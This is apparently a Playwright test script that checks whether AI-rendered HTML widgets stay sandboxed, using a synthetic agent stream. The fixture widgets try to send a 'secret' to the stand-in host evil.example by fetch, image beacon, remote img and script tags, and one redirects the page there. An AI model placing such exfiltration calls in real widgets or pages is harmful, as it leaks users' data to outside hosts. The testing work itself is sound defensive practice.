/**
 * Verifies Open Generative UI widgets WITHOUT calling the agent (zero API
 * cost): the run request is answered with a synthetic stream of render_widget
 * calls. One is a working slider that also tries every way out of its sandbox
 * (fetch, an image beacon, a remote <img>, a CDN <script>); one navigates
 * itself away; one was rejected by the server. Checks that the widget works,
 * that nothing it tried left the browser, and that the navigator is closed.
 *
 *   node scripts/verify-widget.mjs
 */
import { chromium } from "playwright-core";
import fs from "node:fs";
import path from "node:path";

const BASE = process.env.BASE_URL ?? "http://localhost:3000";
const OUT = process.env.OUT_DIR ?? path.resolve("scripts/.out");
fs.mkdirSync(OUT, { recursive: true });

const SLIDER = `<!DOCTYPE html><html><head><title>t</title>
<style>.row{display:flex;gap:12px;align-items:center;padding:12px} output{font-weight:600;color:var(--wb-accent)} #net{color:var(--wb-muted);padding:0 12px}</style>
<script src="https://evil.example/cdn.js"></script></head><body>
<div class="row"><label for="r">Price</label><input id="r" type="range" min="0" max="100" value="40"><output id="o">40</output></div>
<img src="https://evil.example/remote.png" alt="">
<p id="net">checking…</p>
<script>
  const r = document.getElementById("r"), o = document.getElementById("o");
  r.addEventListener("input", () => { o.textContent = r.value; });
  new Image().src = "https://evil.example/beacon.png?d=secret";
  fetch("https://evil.example/leak?d=secret").then(() => { net.textContent = "fetch: sent"; }, () => { net.textContent = "fetch: blocked"; });
</script></body></html>`;
const NAVIGATOR = `<p>Loading…</p><script>setTimeout(() => { location.href = "https://evil.example/away?d=secret"; }, 400);</script>`;

function sse(threadId, runId) {
  const ev = [];
  const push = (e) => ev.push(`data: ${JSON.stringify(e)}\n\n`);
  push({ type: "RUN_STARTED", threadId, runId });
  push({ type: "TEXT_MESSAGE_START", messageId: "m1", role: "assistant" });
  push({ type: "TEXT_MESSAGE_CONTENT", messageId: "m1", delta: "Try it." });
  push({ type: "TEXT_MESSAGE_END", messageId: "m1" });
  const call = (id, args, result) => {
    push({ type: "TOOL_CALL_START", toolCallId: id, toolCallName: "render_widget", parentMessageId: "m1" });
    push({ type: "TOOL_CALL_ARGS", toolCallId: id, delta: JSON.stringify(args) });
    push({ type: "TOOL_CALL_END", toolCallId: id });
    push({ type: "TOOL_CALL_RESULT", toolCallId: id, messageId: `r-${id}`, role: "tool", content: JSON.stringify(result) });
  };
  call("w0", { title: "Too big", html: "x" }, { error: "html is 41,000 characters — keep the widget under 40,000" });
  call("w1", { title: "Price explorer", html: SLIDER, initial_height: 160 }, { rendered: true, widget_id: "price-explorer" });
  call("w2", { title: "Runaway", html: NAVIGATOR, initial_height: 120 }, { rendered: true, widget_id: "runaway" });
  push({ type: "RUN_FINISHED", threadId, runId });
  return ev.join("");
}

const failures = [];
const check = (ok, msg) => {
  console.log(`${ok ? "PASS" : "FAIL"} — ${msg}`);
  if (!ok) failures.push(msg);
};

const browser = await chromium.launch({ channel: "chrome", headless: true });
const page = await browser.newPage({ viewport: { width: 1600, height: 1100 }, deviceScaleFactor: 2 });
const errors = [];
page.on("pageerror", (e) => errors.push(String(e)));
const escaped = [];
// Nothing should reach evil.example; anything that does is recorded and dropped.
await page.route("**://evil.example/**", (route) => {
  escaped.push(new URL(route.request().url()).pathname);
  return route.abort();
});
await page.route("**/api/copilotkit/agent/*/run", async (route) => {
  const body = JSON.parse(route.request().postData() || "{}");
  await route.fulfill({ status: 200, headers: { "content-type": "text/event-stream" }, body: sse(body.threadId, body.runId) });
});

try {
  await page.request.post(`${BASE}/api/session`, { data: { userId: "alex" } });
  await page.goto(BASE, { waitUntil: "networkidle" });
  await page.waitForTimeout(600);
  await page.locator("textarea").first().fill("Let me explore prices");
  await page.locator("textarea").first().press("Enter");
  const widget = page.getByTestId("widget").filter({ hasText: "Price explorer" });
  await widget.waitFor({ timeout: 10000 });
  await page.waitForTimeout(2500);

  const iframe = widget.locator("iframe");
  check((await iframe.count()) === 1, "the widget runs in an iframe");
  check((await iframe.getAttribute("sandbox"))?.trim() === "allow-scripts", "…sandboxed to scripts only (no same-origin, popups, forms or top navigation)");
  const frame = widget.frameLocator("iframe");
  await frame.locator("#r").fill("75");
  check((await frame.locator("#o").textContent()) === "75", "the widget is interactive (slider updates its output)");
  check((await frame.locator("#net").textContent()) === "fetch: blocked", "fetch from the widget is refused");
  const accent = await frame.locator("#o").evaluate((e) => getComputedStyle(e).color);
  check(accent && accent !== "rgb(0, 0, 0)", `the widget can use the workbench's colour tokens (${accent})`);
  const leaks = escaped.filter((p) => p !== "/away");
  check(leaks.length === 0, `nothing the slider tried reached the network${leaks.length ? `: ${leaks.join(", ")}` : ""}`);

  check(await page.getByTestId("widget-closed").isVisible({ timeout: 5000 }).catch(() => false), "a widget that navigates itself away is closed");
  // Control: the capture above does see requests from widget frames — the
  // navigation is the one way out a CSP can't block, and it shows up here.
  check(escaped.includes("/away"), "control: requests from widget frames are captured (the navigation was seen)");
  check(await page.getByTestId("widget-rejected").getByText("keep the widget under").isVisible(), "a rejected widget shows as sent back");

  await widget.scrollIntoViewIfNeeded();
  await widget.screenshot({ path: `${OUT}/widget.png` });
  check(errors.length === 0, `no page errors${errors.length ? `: ${errors.join(" | ")}` : ""}`);
} finally {
  await browser.close();
}
console.log(failures.length ? `\n${failures.length} FAILED` : "\nALL PASS", `— screenshot in ${OUT}`);
process.exit(failures.length ? 1 : 0);
